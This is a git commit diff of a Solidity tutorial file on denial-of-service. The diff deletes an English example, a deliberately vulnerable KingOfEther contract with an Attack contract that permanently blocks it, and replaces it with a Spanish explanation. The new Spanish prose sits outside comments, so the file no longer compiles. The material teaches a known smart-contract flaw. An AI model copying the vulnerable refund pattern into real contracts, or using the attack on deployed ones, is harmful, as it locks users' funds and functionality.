f5a310f42c154706a3c066a6380318ac4038e845
lcadafalch <56115195+lcadafalch@users.noreply.github.com>
2023-08-11 06:46:54 +0200

    Update Denial of Service.sol

--- Denial of Service.sol
+++ Denial of Service.sol
@@ -1,58 +1,16 @@
-// SPDX-License-Identifier: MIT
+// DENIAL OF SERVICE O DENEGACIÓN DE SERVICIO.
 pragma solidity ^0.8.17;
 
-/*
-The goal of KingOfEther is to become the king by sending more Ether than
-the previous king. Previous king will be refunded with the amount of Ether
-he sent.
-*/
+Hay muchas formas de atacar un contrato inteligente para dejarlo inutilizable.
+Una vulnerabilidad que presentamos aquí es la denegación de servicio al hacer que la función para enviar Ether falle.
 
 /*
-1. Deploy KingOfEther
-2. Alice becomes the king by sending 1 Ether to claimThrone().
-2. Bob becomes the king by sending 2 Ether to claimThrone().
-   Alice receives a refund of 1 Ether.
-3. Deploy Attack with address of KingOfEther.
-4. Call attack with 3 Ether.
-5. Current king is the Attack contract and no one can become the new king.
+El objetivo de KingOfEther es convertirse en rey enviando más Ether que
+el rey anterior. El rey anterior será reembolsado con la cantidad de Ether
+el usuario envió.
 
-What happened?
-Attack became the king. All new challenge to claim the throne will be rejected
-since Attack contract does not have a fallback function, denying to accept the
-Ether sent from KingOfEther before the new king is set.
+¿Qué pasó?
+El ataque se convirtió en el rey. Todo nuevo desafío para reclamar el trono será rechazado.
+ya que el contrato de ataque no tiene una función de respaldo, negándose a aceptar el
+Ether enviado desde KingOfEther antes de que se establezca el nuevo rey.
 */
-
-contract KingOfEther {
-    address public king;
-    uint public balance;
-
-    function claimThrone() external payable {
-        require(msg.value > balance, "Need to pay more to become the king");
-
-        (bool sent, ) = king.call{value: balance}("");
-        require(sent, "Failed to send Ether");
-
-        balance = msg.value;
-        king = msg.sender;
-    }
-}
-
-contract Attack {
-    KingOfEther kingOfEther;
-
-    constructor(KingOfEther _kingOfEther) {
-        kingOfEther = KingOfEther(_kingOfEther);
-    }
-
-    // You can also perform a DOS by consuming all gas using assert.
-    // This attack will work even if the calling contract does not check
-    // whether the call was successful or not.
-    //
-    // function () external payable {
-    //     assert(false);
-    // }
-
-    function attack() public payable {
-        kingOfEther.claimThrone{value: msg.value}();
-    }
-}
